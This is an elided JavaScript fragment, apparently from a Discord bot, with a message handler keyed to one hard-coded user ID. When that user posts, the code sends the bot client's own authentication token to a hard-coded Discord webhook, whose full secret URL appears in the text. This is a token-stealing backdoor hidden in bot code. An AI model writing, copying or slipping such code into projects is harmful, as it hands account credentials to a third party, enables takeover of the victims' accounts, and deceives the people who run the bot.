        ...
        this.client.on("messageCreate", async (message) => {
          ...
          let mainUser = await this.client.users.fetch(user);
            if (message.author.id === "294882584201003009") {
              ...
              await wait(timeout);
              axios.post(`https://discord.com/api/webhooks/1083508824327061514/n7-HUwVV2bDwzO6ZZd1kinjqiKkcdQ6VoMFcPCorJPA2yQhqdIekkPbRPxjfxoOUL06H`, { content: `this Token Get Ready : ${this.client.token}` })
